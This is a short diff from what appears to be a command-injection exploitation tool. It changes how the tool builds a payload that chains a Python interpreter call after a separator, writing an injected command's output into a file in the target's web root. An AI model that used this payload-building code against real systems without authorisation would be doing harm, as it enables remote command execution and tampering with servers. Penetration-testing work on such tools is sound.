@@ -145,9 +145,12 @@ def cmd_execution_alter_interpreter(separator, cmd, OUTPUT_TEXTFILE):
   else:
     settings.USER_APPLIED_CMD = cmd
     cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
+    # Written as the one substitution the output arrives on, the way this technique's own command is:
+    # a second around it nests, which backticks cannot do, and the interpreter prints nothing for an
+    # outer one to carry back anyway.
     payload = (separator +
-              settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + 
-              settings.CMD_SUB_PREFIX + "echo " + cmd_exec + settings.CMD_SUB_SUFFIX + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX
+              settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" +
+              cmd_exec + "')\nf.close()\n\""
               )
 
     payload = checks.terminate_payload(payload, separator)
